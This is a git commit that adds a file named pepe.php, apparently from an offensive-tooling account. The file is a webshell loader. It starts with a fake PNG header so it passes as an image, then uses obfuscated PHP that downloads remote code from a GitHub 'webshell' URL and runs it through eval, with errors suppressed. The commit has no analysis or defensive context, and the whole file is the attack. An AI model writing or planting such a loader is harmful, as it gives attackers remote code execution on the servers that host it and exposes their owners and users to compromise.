a31b975d2a0f1880771b638b1f05c473d3076f88
exploit-haxor1337 <76028485+exploit-haxor@users.noreply.github.com>
2024-10-22 02:21:07 +0700

    Create pepe.php

---
+++ pepe.php
@@ -0,0 +1,2 @@
+"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(rawurldecode(urldecode(https%3A%2F%2Fraw.githubusercontent.com%2Fexploit-haxor%2Fwebshell%2Fmain%2Fpepe.phtml"))));/**/?>
